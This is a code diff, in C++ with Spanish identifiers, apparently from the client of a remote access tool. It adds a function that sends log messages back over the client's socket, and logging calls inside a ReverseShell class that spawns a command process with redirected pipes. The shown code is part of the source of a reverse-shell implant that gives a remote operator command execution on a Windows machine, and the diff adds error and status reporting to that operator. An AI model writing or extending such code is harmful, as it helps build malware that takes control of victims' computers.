@@ -1369,6 +1369,11 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
     return bOutput;
 }
 
+//Log Remoto
+void Cliente::m_RemoteLog(const std::string _strMsg) {
+    this->cChunkSend(this->sckSocket, _strMsg.c_str(), _strMsg.size(), 0, false, nullptr, EnumComandos::LOG);
+}
+
 //Misc
 std::string Cliente::ObtenerDesk() {
     TCHAR szTemp[MAX_PATH];
@@ -1415,6 +1420,7 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     sa.lpSecurityDescriptor = nullptr;
     sa.bInheritHandle = true;
     if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
+        cCliente->m_RemoteLog("[SHELL] CreatePipe error: " + std::to_string(GetLastError()));
         __DBG_("Error creando tuberias");
         return false;
     }
@@ -1427,12 +1433,14 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     si.hStdInput = this->stdinRd;
 
     if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
+        cCliente->m_RemoteLog("[SHELL] CreateProcess error: " + std::to_string(GetLastError()));
         __DBG_("No se pudo spawnear la shell");
         return false;
     }
     
     //La shell esta corriendo
     this->isRunning = true;
+    cCliente->m_RemoteLog("[SHELL] Corriendo...");
     __DBG_("Running!");
     
     this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
@@ -1524,6 +1532,7 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
     DWORD dBytesWrited = 0;
     //stdinWr tuberia de entrada
     if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
+        cCliente->m_RemoteLog("[SHELL] WriteFile error: " + std::to_string(GetLastError()));
         __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
         std::unique_lock<std::mutex> lock(this->mutex_shell);
         this->isRunning = false;
